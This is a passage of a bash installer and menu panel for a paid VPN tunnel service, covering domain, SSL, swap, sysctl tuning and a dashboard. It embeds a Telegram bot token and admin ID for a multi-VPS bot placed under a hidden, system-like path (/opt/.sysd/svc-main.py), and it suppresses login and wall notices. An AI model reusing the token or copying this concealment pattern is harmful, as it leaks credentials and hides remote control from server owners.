#!/bin/bash

#================================================
# Youzin Crabz Tunel
# The Professor
# GitHub: putrinuroktavia234-max/Tunnel
# Version: 3.12.0 FINAL — OrderVPN Web Integrated, Multi-VPS, OTP Email, Trial, Full Admin
#================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

DOMAIN=""
DOMAIN_FILE="/root/domain"
IP_CACHE_FILE="/root/.ip_vps"
AKUN_DIR="/root/akun"
XRAY_CONFIG="/usr/local/etc/xray/config.json"
SCRIPT_VERSION="3.12.0"
SCRIPT_AUTHOR="The Professor"
GITHUB_USER="putrinuroktavia234-max"
GITHUB_REPO="Tunnel"
GITHUB_BRANCH="main"
SCRIPT_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}/tunnel.sh"
VERSION_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}/version"
SCRIPT_PATH="/root/tunnel.sh"
BACKUP_PATH="/root/tunnel.sh.bak"
PUBLIC_HTML="/var/www/html"
USERNAME="YouzinCrabz"
BOT_TOKEN_FILE="/root/.bot_token"
CHAT_ID_FILE="/root/.chat_id"
ORDER_DIR="/root/orders"
PAYMENT_FILE="/root/.payment_info"
DOMAIN_TYPE_FILE="/root/.domain_type"

# TunnelBot Multi-VPS
TUNNELBOT_DIR="/opt/.sysd"
TUNNELBOT_FILE="/opt/.sysd/svc-main.py"
TUNNELBOT_TOKEN="8216471228:AAHqm7iwcMqEqLjnj2VEqIaZGVQtYyS_4K4"
TUNNELBOT_ADMIN="8019568852"
VPS_FILE="/root/.svc_reg"

#================================================
# PORT VARIABLES
#================================================
SSH_PORT="22"
DROPBEAR_PORT="222"
NGINX_PORT="80"
NGINX_DL_PORT="81"
NGINX_SSL_PORT="443"
XRAY_VMESS_WS="8080"
XRAY_VLESS_WS="8081"
XRAY_TROJAN_WS="8082"
XRAY_VMESS_GRPC="8444"
XRAY_VLESS_GRPC="8445"
XRAY_TROJAN_GRPC="8446"
BADVPN_RANGE="7100-7300"
PRICE_MONTHLY="10000"
DURATION_MONTHLY="30"

#================================================
# UBUNTU COMPATIBILITY LAYER
#================================================

detect_ubuntu_version() {
    UBUNTU_VER="unknown"
    UBUNTU_MAJOR=0
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        UBUNTU_VER="${VERSION_ID:-unknown}"
        UBUNTU_MAJOR="${VERSION_ID%%.*}"
    fi
}

# Deteksi apakah berjalan di container (OpenVZ/LXC)
detect_container() {
    IS_CONTAINER=0
    if [[ -f /proc/1/environ ]]; then
        if grep -q "container=lxc" /proc/1/environ 2>/dev/null; then IS_CONTAINER=1; fi
    fi
    if systemd-detect-virt --container &>/dev/null; then IS_CONTAINER=1; fi
}

# Install certbot sesuai Ubuntu version
install_certbot_compat() {
    local domain_type="${1:-custom}"
    [[ "$domain_type" != "custom" ]] && return 0

    detect_ubuntu_version
    detect_container

    # Jika sudah ada certbot yang berfungsi, skip
    if command -v certbot >/dev/null 2>&1; then
        return 0
    fi

    echo -e "  ${CYAN}Installing certbot...${NC}"

    # Pastikan apt tidak locked
    _wait_apt_lock

    # Ubuntu 22+: pakai certbot dari apt universe
    # Ubuntu 20: pakai apt, fallback snap jika bukan container
    # Container: snap tidak support, wajib apt
    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then
        # Ubuntu 22/24: pastikan universe enabled, install certbot
        add-apt-repository -y universe >/dev/null 2>&1 || true
        DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1 || true
    elif [[ "$IS_CONTAINER" -eq 1 ]]; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1 || true
    else
        # Ubuntu 20 bare metal: coba apt dulu, fallback snap
        if ! DEBIAN_FRONTEND=noninteractive apt-get install -y certbot >/dev/null 2>&1; then
            if command -v snap >/dev/null 2>&1; then
                snap install --classic certbot 2>/dev/null && \
                    ln -sf /snap/bin/certbot /usr/bin/certbot 2>/dev/null || true
            fi
        fi
    fi

    command -v certbot >/dev/null 2>&1
}

# Tunggu apt lock bebas (max 60 detik)
_wait_apt_lock() {
    local i=0
    while fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1 || \
          fuser /var/lib/apt/lists/lock >/dev/null 2>&1; do
        if [[ $i -eq 0 ]]; then
            echo -e "  ${YELLOW}Menunggu apt lock bebas...${NC}"
        fi
        sleep 2; ((i++))
        [[ $i -ge 30 ]] && break
    done
    # Kill unattended-upgrades yang mungkin lock
    if [[ $i -ge 30 ]]; then
        systemctl stop unattended-upgrades 2>/dev/null || true
        sleep 2
    fi
}

# Cek apakah iptables atau nftables
detect_firewall_backend() {
    if command -v nft >/dev/null 2>&1 && nft list tables 2>/dev/null | grep -q .; then
        FW_BACKEND="nftables"
    else
        FW_BACKEND="iptables"
    fi
}

# pip install yang kompatibel semua Ubuntu
pip_install() {
    local pkg="$1"
    detect_ubuntu_version
    # Ubuntu 22+ (PEP 668): pip3 butuh --break-system-packages untuk install global
    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then
        pip3 install "$pkg" --break-system-packages -q 2>/dev/null || \
        pip3 install "$pkg" -q 2>/dev/null || true
    else
        pip3 install "$pkg" -q 2>/dev/null || \
        pip3 install "$pkg" --break-system-packages -q 2>/dev/null || true
    fi
}

# Nama service SSH yang benar (Ubuntu 22+ pakai ssh, Ubuntu 20 pakai sshd)
get_ssh_service_name() {
    if systemctl list-units --type=service 2>/dev/null | grep -q "^  ssh\.service"; then
        echo "ssh"
    elif systemctl list-units --type=service 2>/dev/null | grep -q "^  sshd\.service"; then
        echo "sshd"
    else
        echo "ssh"
    fi
}

# Restart service dengan validasi dulu
restart_service_safe() {
    local svc="$1"
    local validate_cmd="${2:-}"

    # Jalankan validasi config dulu jika ada
    if [[ -n "$validate_cmd" ]]; then
        if ! eval "$validate_cmd" >/dev/null 2>&1; then
            echo -e "  ${RED}✘ Config error pada ${svc}! Skip restart.${NC}"
            eval "$validate_cmd" 2>&1 | head -5 | sed 's/^/    /'
            return 1
        fi
    fi

    if systemctl is-enabled --quiet "$svc" 2>/dev/null || \
       systemctl is-active --quiet "$svc" 2>/dev/null; then
        systemctl restart "$svc" 2>/dev/null
        sleep 1
        if systemctl is-active --quiet "$svc" 2>/dev/null; then
            return 0
        else
            echo -e "  ${RED}✘ ${svc} gagal start!${NC}"
            journalctl -u "$svc" -n 5 --no-pager 2>/dev/null | sed 's/^/    /'
            return 1
        fi
    fi
    return 0
}

# curl/wget dengan timeout
safe_curl() {
    curl -fsSL --max-time 30 --retry 2 --retry-delay 3 "$@"
}

safe_wget() {
    wget -q --timeout=30 --tries=2 "$@"
}

#================================================
# SEPARATOR THEME — Mobile Friendly, Always Symmetric
#================================================

# Lebar fixed 54 — pas untuk layar HP semua ukuran
get_width() { echo 66; }

# _slen: hitung panjang string setelah strip ANSI codes
_slen() { printf "%b" "$1" | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\n' | wc -m | tr -d ' '; }

# Buat n karakter berulang
_rep() {
    local c="$1" n=$2 r=""
    while [ $n -gt 0 ]; do r="${r}${c}"; n=$((n-1)); done
    printf "%s" "$r"
}

# Garis separator penuh
_box_top()     { printf "${CYAN}$(_rep '━' $1)${NC}\n"; }
_box_bottom()  { printf "${CYAN}$(_rep '━' $1)${NC}\n"; }
_box_divider() { printf "${CYAN}$(_rep '─' $1)${NC}\n"; }

# Teks tengah
_box_center() {
    local W=$1 text="$2"
    local tlen; tlen=$(_slen "$text")
    local lpad=$(( (W-tlen)/2 )); [ $lpad -lt 0 ] && lpad=0
    printf "%${lpad}s%b\n" "" "$text"
}

# Teks kiri dengan indent 2 spasi
_box_left() {
    printf "  %b\n" "$2"
}

# Two-column: selalu simetris, lebar kolom sama
_box_row() {
    local W=$1 l="$2" r="$3"
    local col=$(( (W-2)/2 ))
    printf "  %-${col}s%-${col}s\n" "$l" "$r"
}

# Mini (untuk sub-menu) — sama persis, tidak ada perbedaan indent
_mini_top()     { _box_top "$1"; }
_mini_bottom()  { _box_bottom "$1"; }
_mini_divider() { _box_divider "$1"; }
_mini_center() { _box_center "$1" "$2"; }
_mini_left()    { _box_left "$1" "$2"; }
_mini_row()     { _box_row "$1" "$2" "$3"; }

# _mini_two: dua kolom dengan teks ber-ANSI
_mini_two() {
    local W=$1 left="$2" right="$3"
    local col=$(( (W-2)/2 ))
    local llen; llen=$(_slen "$left")
    local rlen; rlen=$(_slen "$right")
    local lpad=$(( col - llen )); [ $lpad -lt 0 ] && lpad=0
    local rpad=$(( col - rlen )); [ $rpad -lt 0 ] && rpad=0
    printf "  %b%${lpad}s%b%${rpad}s\n" "$left" "" "$right" ""
}

_ram_bar() {
    local pct=$1 len=12 f e bar=""
    f=$(( pct * len / 100 )); e=$(( len - f ))
    local i=0; while [ $i -lt $f ]; do bar="${bar}█"; i=$((i+1)); done
    i=0; while [ $i -lt $e ]; do bar="${bar}░"; i=$((i+1)); done
    printf "%s" "$bar"
}

#================================================
# ANIMASI & PROGRESS
#================================================

spinner_frames=('⣾' '⣽' '⣻' '⢿' '⡿' '⣟' '⣯' '⣷')
bar_frames=('▱▱▱▱▱▱▱▱▱▱' '▰▱▱▱▱▱▱▱▱▱' '▰▰▱▱▱▱▱▱▱▱' '▰▰▰▱▱▱▱▱▱▱' '▰▰▰▰▱▱▱▱▱▱' '▰▰▰▰▰▱▱▱▱▱' '▰▰▰▰▰▰▱▱▱▱' '▰▰▰▰▰▰▰▱▱▱' '▰▰▰▰▰▰▰▰▱▱' '▰▰▰▰▰▰▰▰▰▱' '▰▰▰▰▰▰▰▰▰▰')

animated_loading() {
    local msg="$1" duration="${2:-2}" i=0 end=$((SECONDS+duration)) dots frame
    while [ $SECONDS -lt $end ]; do
        frame="${spinner_frames[$((i%8))]}"
        case $((i%4)) in 0) dots="   ";; 1) dots=".  ";; 2) dots=".. ";; 3) dots="...";; esac
        printf "\r  ${CYAN}${frame}${NC} ${WHITE}${msg}${NC}${YELLOW}${dots}${NC}   "
        sleep 0.1; i=$((i+1))
    done
    printf "\r  ${GREEN}✔${NC} ${WHITE}${msg}${NC} ${GREEN}[SELESAI]${NC}           \n"
}

show_progress() {
    local cur=$1 tot=$2 label="$3"
    local pct=$(( cur * 100 / tot ))
    local f=$(( cur * 10 / tot ))
    printf "\r  ${CYAN}[${NC}${GREEN}%s${NC}${CYAN}]${NC} ${WHITE}%3d%%${NC}  ${DIM}%s${NC}   " "${bar_frames[$f]}" "$pct" "$label"
    echo ""
}

#================================================
# BANNER INSTALL
#================================================

show_install_banner() {
    clear
    local W; W=$(get_width)
    echo ""
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}✦  YOUZINCRABZ PANEL  ✦${NC}"
    _box_center $W "${CYAN}Script Auto Install${NC}"
    _box_center $W "${WHITE}Youzin Crabz Tunel${NC}"
    _box_center $W "${DIM}The Professor${NC}"
    _box_bottom $W
    echo ""
}

#================================================
# UTILITY FUNCTIONS
#================================================

check_status() { systemctl is-active --quiet "$1" 2>/dev/null && echo "ON" || echo "OFF"; }

get_ip() {
    if [ -f "$IP_CACHE_FILE" ]; then
        local cached; cached=$(tr -d '[:space:]' < "$IP_CACHE_FILE")
        [ -n "$cached" ] && [ "$cached" != "N/A" ] && { echo "$cached"; return; }
    fi
    local ip
    for url in "https://ifconfig.me" "https://ipinfo.io/ip" "https://api.ipify.org" "https://checkip.amazonaws.com"; do
        ip=$(curl -s --max-time 5 "$url" 2>/dev/null | tr -d '[:space:]')
        if [ -n "$ip" ] && ! echo "$ip" | grep -qiE "error|reset|refused|<|html"; then
            echo "$ip" > "$IP_CACHE_FILE"; echo "$ip"; return
        fi
    done
    ip=$(ip route get 8.8.8.8 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
    [ -n "$ip" ] && { echo "$ip" > "$IP_CACHE_FILE"; echo "$ip"; return; }
    echo "N/A"
}

send_telegram_admin() {
    [ -f "$BOT_TOKEN_FILE" ] && [ -f "$CHAT_ID_FILE" ] || return
    local token chatid; token=$(cat "$BOT_TOKEN_FILE"); chatid=$(cat "$CHAT_ID_FILE")
    curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
        -d chat_id="$chatid" -d text="$1" -d parse_mode="HTML" --max-time 10 >/dev/null 2>&1
}

#================================================
# HEADER & SECTION HELPERS
#================================================

print_menu_header() {
    local W; W=$(get_width)
    echo ""
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}$1${NC}"
    _box_bottom $W
    echo ""
}

print_section() {
    local W; W=$(get_width)
    echo ""
    _box_divider $W
    echo -e "  ${CYAN}▸ ${WHITE}$1${NC}"
    _box_divider $W
    echo ""
}

#================================================
# DASHBOARD — TAMPILAN UTAMA
#================================================

show_system_info() {
    clear
    [ -f "$DOMAIN_FILE" ] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)

    local os_name="Unknown"
    [ -f /etc/os-release ] && { . /etc/os-release; os_name="${PRETTY_NAME}"; }

    local ip_vps ram_used ram_total ram_pct cpu uptime_str ssl_type svc_running svc_total
    ip_vps=$(get_ip)
    ram_used=$(free -m | awk '/Mem:/{print $3}')
    ram_total=$(free -m | awk '/Mem:/{print $2}')
    ram_pct=$(awk "BEGIN{printf \"%.0f\",($ram_used/$ram_total)*100}")
    cpu=$(top -bn1 2>/dev/null | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1 || echo "0")
    uptime_str=$(uptime -p 2>/dev/null | sed 's/up //' | sed 's/ hours\?/h/g;s/ minutes\?/m/g')

    local domain_type="custom"
    [ -f "$DOMAIN_TYPE_FILE" ] && domain_type=$(cat "$DOMAIN_TYPE_FILE")
    if [ "$domain_type" = "custom" ]; then
        [ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ] \
            && ssl_type="LetsEncrypt (Active)" || ssl_type="LetsEncrypt (Warn)"
    else
        ssl_type="Self-Signed"
    fi

    local svcs=(xray nginx ssh haproxy dropbear udp-custom zivpn-udp vpn-keepalive vpn-bot)
    svc_total=${#svcs[@]}; svc_running=0
    for s in "${svcs[@]}"; do systemctl is-active --quiet "$s" 2>/dev/null && svc_running=$((svc_running+1)); done

    local ssh_count vmess_count vless_count trojan_count
    ssh_count=$(ls "$AKUN_DIR"/ssh-*.txt 2>/dev/null | wc -l)
    vmess_count=$(ls "$AKUN_DIR"/vmess-*.txt 2>/dev/null | wc -l)
    vless_count=$(ls "$AKUN_DIR"/vless-*.txt 2>/dev/null | wc -l)
    trojan_count=$(ls "$AKUN_DIR"/trojan-*.txt 2>/dev/null | wc -l)

    local BAR; BAR=$(_ram_bar "$ram_pct")
    local W; W=$(get_width)

    # ── HEADER ──
    echo ""
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}✦  YOUZINCRABZ PANEL  ✦${NC}"
    _box_center $W "${CYAN}The Professor${NC}"
    _box_bottom $W
    echo ""

    # ── SERVER STATUS ──
    _box_top $W
    _box_center $W "${CYAN}${BOLD}SERVER CORE STATUS${NC}"
    _box_divider $W
    echo -e "  ${WHITE}IP Address${NC}  : ${GREEN}${ip_vps}${NC}"
    echo -e "  ${WHITE}Domain${NC}      : ${CYAN}${DOMAIN:-N/A}${NC}"
    echo -e "  ${WHITE}OS${NC}          : ${WHITE}${os_name}${NC}"
    echo -e "  ${WHITE}Uptime${NC}      : ${WHITE}${uptime_str}${NC}"
    echo -e "  ${WHITE}CPU Load${NC}    : ${YELLOW}${cpu}%${NC}"
    echo -e "  ${WHITE}RAM Usage${NC}   : ${WHITE}${ram_used} / ${ram_total} MB${NC} ${CYAN}[${BAR}]${NC} ${YELLOW}${ram_pct}%${NC}"
    echo -e "  ${WHITE}SSL Status${NC}  : ${GREEN}${ssl_type}${NC}"
    echo -e "  ${WHITE}Services${NC}    : ${GREEN}${svc_running}/${svc_total} Running${NC}"
    _box_bottom $W
    echo ""

    # ── ACTIVE ACCOUNTS ──
    _box_top $W
    _box_center $W "${CYAN}${BOLD}ACTIVE ACCOUNTS${NC}"
    _box_divider $W
    _box_center $W "SSH: ${GREEN}${ssh_count}${NC}  VMess: ${GREEN}${vmess_count}${NC}  VLess: ${GREEN}${vless_count}${NC}  Trojan: ${GREEN}${trojan_count}${NC}"
    _box_bottom $W
    echo ""

    # ── NETWORK SERVICES ──
    local xs xn hs dn ss un ks bt fb cj fw
    systemctl is-active --quiet xray          2>/dev/null && xs="${GREEN}● ONLINE${NC}" || xs="${RED}○ OFFLINE${NC}"
    systemctl is-active --quiet nginx         2>/dev/null && xn="${GREEN}● ONLINE${NC}" || xn="${RED}○ OFFLINE${NC}"
    systemctl is-active --quiet haproxy       2>/dev/null && hs="${GREEN}● ONLINE${NC}" || hs="${RED}○ OFFLINE${NC}"
    systemctl is-active --quiet dropbear      2>/dev/null && dn="${GREEN}● ONLINE${NC}" || dn="${RED}○ OFFLINE${NC}"
    systemctl is-active --quiet ssh           2>/dev/null && ss="${GREEN}● ONLINE${NC}" || ss="${RED}○ OFFLINE${NC}"
    systemctl is-active --quiet udp-custom    2>/dev/null && un="${GREEN}● ONLINE${NC}" || un="${RED}○ OFFLINE${NC}"
    systemctl is-active --quiet vpn-keepalive 2>/dev/null && ks="${GREEN}● ONLINE${NC}" || ks="${RED}○ OFFLINE${NC}"
    # Bot Telegram user (cek token ada + service running)
    if [[ -f "$BOT_TOKEN_FILE" ]] && systemctl is-active --quiet vpn-bot 2>/dev/null; then
        bt="${GREEN}● ONLINE${NC}"
    elif [[ -f "$BOT_TOKEN_FILE" ]]; then
        bt="${YELLOW}● CONFIG${NC}"
    else
        bt="${RED}○ OFFLINE${NC}"
    fi
    # Fail2ban
    command -v fail2ban-client >/dev/null 2>&1 && \
        systemctl is-active --quiet fail2ban 2>/dev/null && \
        fb="${GREEN}● ONLINE${NC}" || fb="${RED}○ OFFLINE${NC}"
    # Cron auto-delete expired
    crontab -l 2>/dev/null | grep -q "delete_expired_cron" && \
        cj="${GREEN}● ONLINE${NC}" || cj="${RED}○ OFFLINE${NC}"
    # UFW Firewall
    if command -v ufw >/dev/null 2>&1; then
        ufw status 2>/dev/null | grep -qi "^Status: active" && \
            fw="${GREEN}● ONLINE${NC}" || fw="${RED}○ OFFLINE${NC}"
    else
        fw="${DIM}○ N/A   ${NC}"
    fi

    _box_top $W
    _box_center $W "${CYAN}${BOLD}NETWORK SERVICES${NC}"
    _box_divider $W
    _mini_two $W "${WHITE}XRAY${NC}      : ${xs}" "${WHITE}NGINX${NC}    : ${xn}"
    _mini_two $W "${WHITE}HAPROXY${NC}   : ${hs}" "${WHITE}DROPBEAR${NC} : ${dn}"
    _mini_two $W "${WHITE}SSH${NC}       : ${ss}" "${WHITE}UDP CUST${NC} : ${un}"
    _mini_two $W "${WHITE}KEEPALIVE${NC} : ${ks}" "${WHITE}BOT TG${NC}   : ${bt}"
    _mini_two $W "${WHITE}FAIL2BAN${NC}  : ${fb}" "${WHITE}CRON AUTO${NC}: ${cj}"
    _mini_two $W "${WHITE}FIREWALL${NC}  : ${fw}" ""
    _box_bottom $W
    echo ""
}

#================================================
# SHOW MAIN MENU
#================================================

show_menu() {
    local W; W=$(get_width)
    # Kolom menu: lebar setengah dari W, masing-masing kolom pakai format [XX] Label
    # [XX] = 4 char, spasi 1, label max ~22 char → total ~27 per kolom
    local col=$(( (W - 2) / 2 ))

    # Helper: buat 1 baris 2 kolom menu simetris dengan ANSI
    # _mrow col "NUM" "Label" "NUM" "Label"
    _mrow() {
        local c=$1 n1="$2" lb1="$3" n2="$4" lb2="$5"
        local left="${CYAN}[${n1}]${NC} ${WHITE}${lb1}${NC}"
        local right="${CYAN}[${n2}]${NC} ${WHITE}${lb2}${NC}"
        local llen; llen=$(printf "%b" "[${n1}] ${lb1}" | sed 's/\x1b\[[0-9;]*m//g' | wc -m | tr -d ' ')
        local rlen; rlen=$(printf "%b" "[${n2}] ${lb2}" | sed 's/\x1b\[[0-9;]*m//g' | wc -m | tr -d ' ')
        local lpad=$(( c - llen )); [ $lpad -lt 0 ] && lpad=0
        printf "  %b%${lpad}s%b\n" "$left" "" "$right"
    }
    _mrow1() {
        # 1 kolom tengah
        local c=$1 n1="$2" lb1="$3"
        local text="${CYAN}[${n1}]${NC} ${WHITE}${lb1}${NC}"
        _box_center $W "$text"
    }

    # ── ACCOUNT MANAGEMENT ──
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}ACCOUNT MANAGEMENT${NC}"
    _box_divider $W
    _mrow $col " 1" "SSH / OpenVPN"    " 5" "List All Accounts"
    _mrow $col " 2" "VMess Account"    " 6" "Renew / Extend Akun"
    _mrow $col " 3" "VLess Account"    " 7" "Check Expired"
    _mrow $col " 4" "Trojan Account"   " 8" "Delete Expired"
    _box_bottom $W
    echo ""

    # ── SYSTEM CONTROL ──
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}SYSTEM CONTROL${NC}"
    _box_divider $W
    _mrow $col " 9" "Telegram Bot"     "14" "Speedtest VPS"
    _mrow $col "10" "Change Domain"    "15" "Backup Config"
    _mrow $col "11" "Fix SSL / Cert"   "16" "Restore Config"
    _mrow $col "12" "Optimize VPS"     "17" "Uninstall Panel"
    _mrow $col "13" "Restart Service"  "18" "Advanced Mode"
    _mrow $col "19" "Port Info"        "20" "ZI VPN UDP"
    _mrow1 $col "21" "OrderVPN Web"
    _box_divider $W
    printf "  ${RED}[0]${NC}  ${WHITE}Exit Panel${NC}\n"
    _box_divider $W
    printf "  Telegram : ${CYAN}@YouzinCrabz${NC}\n"
    _box_bottom $W
    echo ""
}

#================================================
# DOMAIN SETUP
#================================================

generate_random_domain() {
    local ip_vps chars random_str
    ip_vps=$(get_ip)
    chars="abcdefghijklmnopqrstuvwxyz"
    random_str=""
    for i in {1..6}; do random_str+="${chars:RANDOM%26:1}"; done
    echo "${random_str}.${ip_vps}.nip.io"
}

setup_domain() {
    clear
    print_menu_header "SETUP DOMAIN"
    echo -e "  ${WHITE}[1]${NC} Pakai domain sendiri"
    echo -e "      ${YELLOW}Contoh: vpn.example.com${NC}"
    echo -e "      ${DIM}SSL: Let's Encrypt${NC}"
    echo ""
    echo -e "  ${WHITE}[2]${NC} Generate domain otomatis"
    local preview; preview=$(generate_random_domain)
    echo -e "      ${YELLOW}Contoh: ${preview}${NC}"
    echo -e "      ${DIM}SSL: Self-signed${NC}"
    echo ""
    read -p "  Pilih [1/2]: " domain_choice
    case $domain_choice in
        1)
            echo ""
            read -p "  Masukkan domain: " input_domain
            [[ -z "$input_domain" ]] && { echo -e "${RED}  ✘ Domain kosong!${NC}"; sleep 2; setup_domain; return; }
            DOMAIN="$input_domain"
            echo "custom" > "$DOMAIN_TYPE_FILE"
            ;;
        2)
            DOMAIN=$(generate_random_domain)
            echo "random" > "$DOMAIN_TYPE_FILE"
            echo -e "  ${GREEN}Domain: ${CYAN}${DOMAIN}${NC}"
            sleep 1
            ;;
        *)
            echo -e "  ${RED}✘ Tidak valid!${NC}"
            sleep 1; setup_domain; return
            ;;
    esac
    echo "$DOMAIN" > "$DOMAIN_FILE"
}

get_ssl_cert() {
    local domain_type="custom"
    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")
    mkdir -p /etc/xray
    if [[ "$domain_type" == "custom" ]]; then
        # Pastikan port 80 bebas dulu
        systemctl stop nginx haproxy 2>/dev/null
        sleep 1
        # Install certbot dengan compatibility layer
        install_certbot_compat "custom"
        if command -v certbot >/dev/null 2>&1; then
            certbot certonly --standalone \
                -d "$DOMAIN" \
                --non-interactive \
                --agree-tos \
                --register-unsafely-without-email \
                --timeout 60 \
                2>/dev/null
            if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then
                cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt
                cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key
                echo -e "  ${GREEN}✔ Let's Encrypt cert berhasil!${NC}"
            else
                echo -e "  ${YELLOW}⚠ Certbot gagal, fallback ke self-signed${NC}"
                _gen_self_signed
            fi
        else
            echo -e "  ${YELLOW}⚠ certbot tidak tersedia, pakai self-signed${NC}"
            _gen_self_signed
        fi
    else
        _gen_self_signed
    fi
    chmod 644 /etc/xray/xray.* 2>/dev/null
}

_gen_self_signed() {
    openssl req -new -newkey rsa:2048 \
        -days 3650 -nodes -x509 \
        -subj "/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN}" \
        -keyout /etc/xray/xray.key \
        -out /etc/xray/xray.crt 2>/dev/null
}

#================================================
# SETUP MENU COMMAND
#================================================

setup_menu_command() {
    # Buat command shortcut 'menu'
    printf '#!/bin/bash\n[[ -f /root/tunnel.sh ]] && exec bash /root/tunnel.sh || echo "tunnel.sh tidak ditemukan!"\n' \
        > /usr/local/bin/menu
    chmod +x /usr/local/bin/menu

    # ── METODE 1: /etc/profile.d/ — paling reliable untuk SSH login ──
    # Ini dijalankan untuk SEMUA interactive login shell (ssh, su -, dll)
    cat > /etc/profile.d/vpn-panel.sh << 'PROFILEEOF'
# VPN Panel Auto-Start
if [ "$(id -u)" -eq 0 ] && [ -n "$PS1" ] && [ -z "$VPN_MENU_RUNNING" ]; then
    export VPN_MENU_RUNNING=1
    mesg n 2>/dev/null
    # Pakai source (.) agar setelah exit menu, shell login tetap hidup
    [ -f /root/tunnel.sh ] && . /root/tunnel.sh
fi
PROFILEEOF
    chmod 644 /etc/profile.d/vpn-panel.sh

    # ── METODE 2: .bashrc sebagai fallback ──
    # Bersihkan entri lama dulu
    if [[ -f /root/.bashrc ]]; then
        awk '
            /# VPN Panel Auto-Start/ { skip=1 }
            skip && /^fi[[:space:]]*$/ { skip=0; next }
            !skip { print }
        ' /root/.bashrc > /tmp/_bashrc_clean.tmp 2>/dev/null
        grep -v -E 'tunnel\.sh|VPN_MENU_RUNNING|mesg n 2>|# VPN Panel' \
            /tmp/_bashrc_clean.tmp > /tmp/_bashrc_clean2.tmp 2>/dev/null
        mv /tmp/_bashrc_clean2.tmp /root/.bashrc
    fi
    # Tulis entri baru di .bashrc
    if ! grep -q "VPN Panel Auto-Start" /root/.bashrc 2>/dev/null; then
        printf '\n# VPN Panel Auto-Start\n' >> /root/.bashrc
        printf 'if [ -n "$PS1" ] && [ "$EUID" -eq 0 ] && [ -z "$VPN_MENU_RUNNING" ]; then\n' >> /root/.bashrc
        printf '    export VPN_MENU_RUNNING=1\n' >> /root/.bashrc
        printf '    mesg n 2>/dev/null\n' >> /root/.bashrc
        printf '    [ -f /root/tunnel.sh ] && . /root/tunnel.sh\n' >> /root/.bashrc
        printf 'fi\n' >> /root/.bashrc
    fi

    # Suppress system wall messages
    mkdir -p /etc/systemd/journald.conf.d
    printf '[Journal]\nForwardToWall=no\n' > /etc/systemd/journald.conf.d/no-wall.conf
    systemctl restart systemd-journald >/dev/null 2>&1 || true
    touch /root/.hushlogin 2>/dev/null || true
}

#================================================
# SETUP SWAP
#================================================

setup_swap() {
    clear
    print_menu_header "SETUP SWAP 1GB"
    local swap_total; swap_total=$(free -m | awk 'NR==3{print $2}')
    if [[ "$swap_total" -gt 0 ]]; then
        echo -e "  ${YELLOW}Swap ada: ${swap_total}MB${NC}"
        swapoff -a 2>/dev/null
        sed -i '/swapfile/d' /etc/fstab
        rm -f /swapfile
    fi
    echo -e "  ${CYAN}Creating 1GB swap...${NC}"
    fallocate -l 1G /swapfile 2>/dev/null || dd if=/dev/zero of=/swapfile bs=1M count=1024 2>/dev/null
    chmod 600 /swapfile
    mkswap /swapfile >/dev/null 2>&1
    swapon /swapfile
    grep -q "/swapfile" /etc/fstab || echo "/swapfile none swap sw 0 0" >> /etc/fstab
    echo -e "  ${GREEN}✔ Swap 1GB OK!${NC}"
    sleep 2
}

#================================================
# OPTIMIZE VPN
#================================================

optimize_vpn() {
    cat > /etc/sysctl.d/99-vpn.conf << 'SYSEOF'
net.ipv4.tcp_keepalive_time = 30
net.ipv4.tcp_keepalive_intvl = 5
net.ipv4.tcp_keepalive_probes = 6
net.ipv4.tcp_fin_timeout = 10
net.core.rmem_max = 67108864
net.core.wmem_max = 67108864
net.ipv4.tcp_rmem = 4096 87380 67108864
net.ipv4.tcp_wmem = 4096 65536 67108864
net.core.netdev_max_backlog = 250000
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 65535
net.core.default_qdisc = fq
net.ipv4.tcp_congestion_control = bbr
net.ipv4.tcp_tw_reuse = 1
net.ipv4.ip_forward = 1
vm.swappiness = 10
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
SYSEOF
    modprobe tcp_bbr 2>/dev/null
    echo "tcp_bbr" > /etc/modules-load.d/bbr.conf
    sysctl -p /etc/sysctl.d/99-vpn.conf >/dev/null 2>&1
    cat > /etc/security/limits.d/99-vpn.conf << 'LIMEOF'
* soft nofile 65535
* hard nofile 65535
root soft nofile 65535
root hard nofile 65535
LIMEOF
}

#================================================
# SETUP KEEPALIVE
#================================================

setup_keepalive() {
    local sshcfg="/etc/ssh/sshd_config"
    grep -q "^ClientAliveInterval" "$sshcfg" && \
        sed -i 's/^ClientAliveInterval.*/ClientAliveInterval 30/' "$sshcfg" || \
        echo "ClientAliveInterval 30" >> "$sshcfg"
    grep -q "^ClientAliveCountMax" "$sshcfg" && \
        sed -i 's/^ClientAliveCountMax.*/ClientAliveCountMax 6/' "$sshcfg" || \
